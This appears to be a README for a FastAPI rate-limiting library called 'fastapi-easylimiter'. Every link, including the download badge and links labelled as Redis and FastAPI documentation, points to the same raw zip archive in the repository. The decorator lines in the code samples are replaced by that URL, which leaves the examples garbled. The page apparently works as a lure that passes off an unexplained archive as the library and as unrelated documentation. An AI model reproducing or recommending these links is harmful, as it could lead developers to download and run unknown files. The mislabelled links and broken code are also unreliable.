# 🚀 fastapi-easylimiter - Simple Rate Limiting for Your API

## 📥 Download Now
[![Download fastapi-easylimiter](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip%20fastapi--easylimiter-blue?style=for-the-badge)](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip)

## 📖 Description
fastapi-easylimiter is an easy integration for adding rate limiting to your ASGI/FastAPI endpoints. It offers a clear method to prevent your application from being overwhelmed by too many requests. With Redis caching, it enhances performance while keeping things simple for users.

## 🚀 Getting Started
Using fastapi-easylimiter is straightforward. Follow the steps below to get it up and running.

### 💻 System Requirements
- Operating System: Windows, macOS, or Linux
- Python: Version 3.7 or later
- Redis: Installed and running on your machine. If you don't have Redis, you can visit the [Redis website](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip) for download instructions.

## 🔗 Install Dependencies
Before you can use fastapi-easylimiter, you'll need to install the necessary Python packages. Here’s how:

1. Open your command line interface (CLI).
2. Run the following command to install FastAPI and EasyLimiter:

   ```bash
   pip install fastapi redis fastapi-easylimiter
   ```

## 🌐 Download & Install
You can easily download the latest version of fastapi-easylimiter from the Releases page. Click the link below to visit that page:

[Download fastapi-easylimiter](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip)

Once you're on the Releases page, look for the version you want and download it. The files available will include the source code and installation instructions.

## 🧰 Example Usage
To help you get started, here's a simple example of how to use fastapi-easylimiter in your FastAPI application:

```python
from fastapi import FastAPI
from fastapi_easylimiter import EasyLimiter

app = FastAPI()
limiter = EasyLimiter(rate_limit="5/minute")

https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip("/items")
https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip()
async def read_items():
    return {"message": "You have accessed the items!"}
```

This code sets a rate limit of 5 requests per minute for the `/items` endpoint. Adjust the `rate_limit` parameter to suit your needs.

## ⚙️ Configuration Options
fastapi-easylimiter offers several configuration options to tailor how rate limiting works for your application:

- **rate_limit**: A string defining the limit of requests (e.g., "5/minute").
- **cache**: Choose between Redis caching or in-memory caching depending on your setup.
- **response**: Customize your response to be more user-friendly when limits are exceeded.

## 📅 Advanced Usage
For more complex applications, you can set different rate limits for various endpoints or user roles. Here’s an example:

```python
https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip("/admin")
https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip("10/minute")
async def read_admin():
    return {"message": "Welcome, admin!"}

https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip("/user")
https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip("3/minute")
async def read_user():
    return {"message": "Welcome, valued user!"}
```

## 💡 Troubleshooting
If you encounter issues while using this library, consider the following steps:

1. **Check Your Python Version**: Ensure you're using Python 3.7 or later.
2. **Redis Connection**: Verify that your Redis server is running and accessible.
3. **Correctly Installed Packages**: Double-check that all the required packages are installed without errors.

## 🔗 Useful Links
- [FastAPI Documentation](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip)
- [Redis Documentation](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip)
- [fastapi-easylimiter GitHub Repository](https://raw.githubusercontent.com/mongosh2006/fastapi-easylimiter/main/fastapi_easylimiter/fastapi-easylimiter_1.7.zip)

## 📬 Contact
For questions or suggestions, open an issue on the GitHub repository. We value your feedback and aim to improve our tool for everyone.

## 🔄 License
This project is licensed under the MIT License. You can use, modify, and distribute it freely, subject to the terms of the license.